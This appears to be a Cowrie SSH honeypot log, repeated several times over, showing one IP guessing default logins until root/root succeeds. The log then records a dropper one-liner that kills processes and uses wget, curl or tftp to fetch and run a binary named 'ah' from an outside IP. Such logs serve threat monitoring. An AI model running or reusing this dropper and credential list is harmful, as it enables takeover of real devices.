2023-11-30T01:42:07.349000Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: linuxshell
2023-11-30T01:42:07.354857Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
2023-11-30T01:42:07.355450Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cd /tmp/
2023-11-30T01:42:07.355807Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo senpai > rootsenpai
2023-11-30T01:42:07.356814Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cat rootsenpai
2023-11-30T01:42:07.357419Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: rm -rf rootsenpai
2023-11-30T01:42:07.457483Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah
2023-11-30T01:42:07.458423Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.459906Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.460015Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.460604Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.461305Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.461404Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.462372Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command for
2023-11-30T01:42:07.462472Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: for dir in /proc/ [ 0-9 ] *
2023-11-30T01:42:07.463164Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command deleted
2023-11-30T01:42:07.463262Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: deleted $dir/maps
2023-11-30T01:42:07.463781Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo Killing process with PID: 
2023-11-30T01:42:07.464210Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: kill -9 
2023-11-30T01:42:07.464521Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: done ;; rm -rf ah
2023-11-30T01:42:07.464818Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: wget http://94.156.68.152/ah
2023-11-30T01:42:57.566448Z [HoneyPotSSHTransport,46,204.76.203.13] Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
2023-11-30T01:42:57.567406Z [HoneyPotSSHTransport,46,204.76.203.13] Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds
2023-11-30T01:42:57.643590Z [HoneyPotSSHTransport,46,204.76.203.13] avatar root logging out
2023-11-30T01:42:57.643806Z [HoneyPotSSHTransport,46,204.76.203.13] Connection lost after 51 seconds
2023-11-30T01:41:53.571325Z [HoneyPotSSHTransport,42,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:53.647609Z [HoneyPotSSHTransport,42,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:54.047697Z [HoneyPotSSHTransport,42,204.76.203.13] first time for 204.76.203.13, need: 5
2023-11-30T01:41:54.047814Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt: 1
2023-11-30T01:41:54.085794Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt [b'admin'/b'admin'] failed
2023-11-30T01:41:55.166312Z [HoneyPotSSHTransport,42,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:55.166817Z [HoneyPotSSHTransport,42,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:41:55.242107Z [HoneyPotSSHTransport,43,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:55.317557Z [HoneyPotSSHTransport,43,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:55.711661Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt: 2
2023-11-30T01:41:55.750345Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt [b'admin'/b'password'] failed
2023-11-30T01:41:58.998769Z [HoneyPotSSHTransport,43,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:58.999284Z [HoneyPotSSHTransport,43,204.76.203.13] Connection lost after 3 seconds
2023-11-30T01:41:59.075196Z [HoneyPotSSHTransport,44,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:02.031931Z [HoneyPotSSHTransport,44,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:03.676742Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt: 3
2023-11-30T01:42:03.714830Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt [b'ubnt'/b'ubnt'] failed
2023-11-30T01:42:04.792951Z [HoneyPotSSHTransport,44,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:04.793713Z [HoneyPotSSHTransport,44,204.76.203.13] Connection lost after 5 seconds
2023-11-30T01:42:04.868721Z [HoneyPotSSHTransport,45,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:04.944538Z [HoneyPotSSHTransport,45,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:05.336281Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt: 4
2023-11-30T01:42:05.373678Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt [b'admin'/b'123456'] failed
2023-11-30T01:42:06.452556Z [HoneyPotSSHTransport,45,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:06.453447Z [HoneyPotSSHTransport,45,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:42:06.528321Z [HoneyPotSSHTransport,46,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:06.603497Z [HoneyPotSSHTransport,46,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:06.955516Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt: 5
2023-11-30T01:42:06.993253Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt [b'root'/b'root'] succeeded
2023-11-30T01:42:06.994875Z [HoneyPotSSHTransport,46,204.76.203.13] Initialized emulated server as architecture: linux-x64-lsb
2023-11-30T01:42:07.264680Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: enable
2023-11-30T01:42:07.265628Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: enable 
2023-11-30T01:42:07.265865Z [HoneyPotSSHTransport,46,204.76.203.13] Reading txtcmd from "share/cowrie/txtcmds/bin/enable"
2023-11-30T01:42:07.342616Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: system
2023-11-30T01:42:07.343443Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command system
2023-11-30T01:42:07.343543Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: system
2023-11-30T01:42:07.344757Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: shell
2023-11-30T01:42:07.345442Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command shell
2023-11-30T01:42:07.345546Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: shell
2023-11-30T01:42:07.346481Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: sh
2023-11-30T01:42:07.346943Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: sh 
2023-11-30T01:42:07.348235Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: linuxshell
2023-11-30T01:42:07.348894Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command linuxshell
2023-11-30T01:42:07.349000Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: linuxshell
2023-11-30T01:42:07.354857Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
2023-11-30T01:42:07.355450Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cd /tmp/
2023-11-30T01:42:07.355807Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo senpai > rootsenpai
2023-11-30T01:42:07.356814Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cat rootsenpai
2023-11-30T01:42:07.357419Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: rm -rf rootsenpai
2023-11-30T01:42:07.457483Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah
2023-11-30T01:42:07.458423Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.459906Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.460015Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.460604Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.461305Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.461404Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.462372Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command for
2023-11-30T01:42:07.462472Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: for dir in /proc/ [ 0-9 ] *
2023-11-30T01:42:07.463164Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command deleted
2023-11-30T01:42:07.463262Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: deleted $dir/maps
2023-11-30T01:42:07.463781Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo Killing process with PID: 
2023-11-30T01:42:07.464210Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: kill -9 
2023-11-30T01:42:07.464521Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: done ;; rm -rf ah
2023-11-30T01:42:07.464818Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: wget http://94.156.68.152/ah
2023-11-30T01:42:57.566448Z [HoneyPotSSHTransport,46,204.76.203.13] Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
2023-11-30T01:42:57.567406Z [HoneyPotSSHTransport,46,204.76.203.13] Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds
2023-11-30T01:42:57.643590Z [HoneyPotSSHTransport,46,204.76.203.13] avatar root logging out
2023-11-30T01:42:57.643806Z [HoneyPotSSHTransport,46,204.76.203.13] Connection lost after 51 seconds
2023-11-30T01:41:53.571325Z [HoneyPotSSHTransport,42,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:53.647609Z [HoneyPotSSHTransport,42,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:54.047697Z [HoneyPotSSHTransport,42,204.76.203.13] first time for 204.76.203.13, need: 5
2023-11-30T01:41:54.047814Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt: 1
2023-11-30T01:41:54.085794Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt [b'admin'/b'admin'] failed
2023-11-30T01:41:55.166312Z [HoneyPotSSHTransport,42,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:55.166817Z [HoneyPotSSHTransport,42,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:41:55.242107Z [HoneyPotSSHTransport,43,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:55.317557Z [HoneyPotSSHTransport,43,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:55.711661Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt: 2
2023-11-30T01:41:55.750345Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt [b'admin'/b'password'] failed
2023-11-30T01:41:58.998769Z [HoneyPotSSHTransport,43,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:58.999284Z [HoneyPotSSHTransport,43,204.76.203.13] Connection lost after 3 seconds
2023-11-30T01:41:59.075196Z [HoneyPotSSHTransport,44,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:02.031931Z [HoneyPotSSHTransport,44,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:03.676742Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt: 3
2023-11-30T01:42:03.714830Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt [b'ubnt'/b'ubnt'] failed
2023-11-30T01:42:04.792951Z [HoneyPotSSHTransport,44,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:04.793713Z [HoneyPotSSHTransport,44,204.76.203.13] Connection lost after 5 seconds
2023-11-30T01:42:04.868721Z [HoneyPotSSHTransport,45,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:04.944538Z [HoneyPotSSHTransport,45,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:05.336281Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt: 4
2023-11-30T01:42:05.373678Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt [b'admin'/b'123456'] failed
2023-11-30T01:42:06.452556Z [HoneyPotSSHTransport,45,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:06.453447Z [HoneyPotSSHTransport,45,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:42:06.528321Z [HoneyPotSSHTransport,46,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:06.603497Z [HoneyPotSSHTransport,46,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:06.955516Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt: 5
2023-11-30T01:42:06.993253Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt [b'root'/b'root'] succeeded
2023-11-30T01:42:06.994875Z [HoneyPotSSHTransport,46,204.76.203.13] Initialized emulated server as architecture: linux-x64-lsb
2023-11-30T01:42:07.264680Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: enable
2023-11-30T01:42:07.265628Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: enable 
2023-11-30T01:42:07.265865Z [HoneyPotSSHTransport,46,204.76.203.13] Reading txtcmd from "share/cowrie/txtcmds/bin/enable"
2023-11-30T01:42:07.342616Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: system
2023-11-30T01:42:07.343443Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command system
2023-11-30T01:42:07.343543Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: system
2023-11-30T01:42:07.344757Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: shell
2023-11-30T01:42:07.345442Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command shell
2023-11-30T01:42:07.345546Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: shell
2023-11-30T01:42:07.346481Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: sh
2023-11-30T01:42:07.346943Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: sh 
2023-11-30T01:42:07.348235Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: linuxshell
2023-11-30T01:42:07.348894Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command linuxshell
2023-11-30T01:42:07.349000Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: linuxshell
2023-11-30T01:42:07.354857Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
2023-11-30T01:42:07.355450Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cd /tmp/
2023-11-30T01:42:07.355807Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo senpai > rootsenpai
2023-11-30T01:42:07.356814Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cat rootsenpai
2023-11-30T01:42:07.357419Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: rm -rf rootsenpai
2023-11-30T01:42:07.457483Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah
2023-11-30T01:42:07.458423Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.459906Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.460015Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.460604Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.461305Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.461404Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.462372Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command for
2023-11-30T01:42:07.462472Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: for dir in /proc/ [ 0-9 ] *
2023-11-30T01:42:07.463164Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command deleted
2023-11-30T01:42:07.463262Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: deleted $dir/maps
2023-11-30T01:42:07.463781Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo Killing process with PID: 
2023-11-30T01:42:07.464210Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: kill -9 
2023-11-30T01:42:07.464521Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: done ;; rm -rf ah
2023-11-30T01:42:07.464818Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: wget http://94.156.68.152/ah
2023-11-30T01:42:57.566448Z [HoneyPotSSHTransport,46,204.76.203.13] Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
2023-11-30T01:42:57.567406Z [HoneyPotSSHTransport,46,204.76.203.13] Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds
2023-11-30T01:42:57.643590Z [HoneyPotSSHTransport,46,204.76.203.13] avatar root logging out
2023-11-30T01:42:57.643806Z [HoneyPotSSHTransport,46,204.76.203.13] Connection lost after 51 seconds
2023-11-30T01:41:53.571325Z [HoneyPotSSHTransport,42,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:53.647609Z [HoneyPotSSHTransport,42,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:54.047697Z [HoneyPotSSHTransport,42,204.76.203.13] first time for 204.76.203.13, need: 5
2023-11-30T01:41:54.047814Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt: 1
2023-11-30T01:41:54.085794Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt [b'admin'/b'admin'] failed
2023-11-30T01:41:55.166312Z [HoneyPotSSHTransport,42,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:55.166817Z [HoneyPotSSHTransport,42,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:41:55.242107Z [HoneyPotSSHTransport,43,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:55.317557Z [HoneyPotSSHTransport,43,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:55.711661Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt: 2
2023-11-30T01:41:55.750345Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt [b'admin'/b'password'] failed
2023-11-30T01:41:58.998769Z [HoneyPotSSHTransport,43,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:58.999284Z [HoneyPotSSHTransport,43,204.76.203.13] Connection lost after 3 seconds
2023-11-30T01:41:59.075196Z [HoneyPotSSHTransport,44,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:02.031931Z [HoneyPotSSHTransport,44,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:03.676742Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt: 3
2023-11-30T01:42:03.714830Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt [b'ubnt'/b'ubnt'] failed
2023-11-30T01:42:04.792951Z [HoneyPotSSHTransport,44,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:04.793713Z [HoneyPotSSHTransport,44,204.76.203.13] Connection lost after 5 seconds
2023-11-30T01:42:04.868721Z [HoneyPotSSHTransport,45,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:04.944538Z [HoneyPotSSHTransport,45,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:05.336281Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt: 4
2023-11-30T01:42:05.373678Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt [b'admin'/b'123456'] failed
2023-11-30T01:42:06.452556Z [HoneyPotSSHTransport,45,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:06.453447Z [HoneyPotSSHTransport,45,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:42:06.528321Z [HoneyPotSSHTransport,46,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:06.603497Z [HoneyPotSSHTransport,46,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:06.955516Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt: 5
2023-11-30T01:42:06.993253Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt [b'root'/b'root'] succeeded
2023-11-30T01:42:06.994875Z [HoneyPotSSHTransport,46,204.76.203.13] Initialized emulated server as architecture: linux-x64-lsb
2023-11-30T01:42:07.264680Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: enable
2023-11-30T01:42:07.265628Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: enable 
2023-11-30T01:42:07.265865Z [HoneyPotSSHTransport,46,204.76.203.13] Reading txtcmd from "share/cowrie/txtcmds/bin/enable"
2023-11-30T01:42:07.342616Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: system
2023-11-30T01:42:07.343443Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command system
2023-11-30T01:42:07.343543Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: system
2023-11-30T01:42:07.344757Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: shell
2023-11-30T01:42:07.345442Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command shell
2023-11-30T01:42:07.345546Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: shell
2023-11-30T01:42:07.346481Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: sh
2023-11-30T01:42:07.346943Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: sh 
2023-11-30T01:42:07.348235Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: linuxshell
2023-11-30T01:42:07.348894Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command linuxshell
2023-11-30T01:42:07.349000Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: linuxshell
2023-11-30T01:42:07.354857Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
2023-11-30T01:42:07.355450Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cd /tmp/
2023-11-30T01:42:07.355807Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo senpai > rootsenpai
2023-11-30T01:42:07.356814Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cat rootsenpai
2023-11-30T01:42:07.357419Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: rm -rf rootsenpai
2023-11-30T01:42:07.457483Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah
2023-11-30T01:42:07.458423Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.459906Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.460015Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.460604Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.461305Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.461404Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.462372Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command for
2023-11-30T01:42:07.462472Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: for dir in /proc/ [ 0-9 ] *
2023-11-30T01:42:07.463164Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command deleted
2023-11-30T01:42:07.463262Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: deleted $dir/maps
2023-11-30T01:42:07.463781Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo Killing process with PID: 
2023-11-30T01:42:07.464210Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: kill -9 
2023-11-30T01:42:07.464521Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: done ;; rm -rf ah
2023-11-30T01:42:07.464818Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: wget http://94.156.68.152/ah
2023-11-30T01:42:57.566448Z [HoneyPotSSHTransport,46,204.76.203.13] Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
2023-11-30T01:42:57.567406Z [HoneyPotSSHTransport,46,204.76.203.13] Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds
2023-11-30T01:42:57.643590Z [HoneyPotSSHTransport,46,204.76.203.13] avatar root logging out
2023-11-30T01:42:57.643806Z [HoneyPotSSHTransport,46,204.76.203.13] Connection lost after 51 seconds
2023-11-30T01:41:53.571325Z [HoneyPotSSHTransport,42,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:53.647609Z [HoneyPotSSHTransport,42,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:54.047697Z [HoneyPotSSHTransport,42,204.76.203.13] first time for 204.76.203.13, need: 5
2023-11-30T01:41:54.047814Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt: 1
2023-11-30T01:41:54.085794Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt [b'admin'/b'admin'] failed
2023-11-30T01:41:55.166312Z [HoneyPotSSHTransport,42,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:55.166817Z [HoneyPotSSHTransport,42,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:41:55.242107Z [HoneyPotSSHTransport,43,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:55.317557Z [HoneyPotSSHTransport,43,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:55.711661Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt: 2
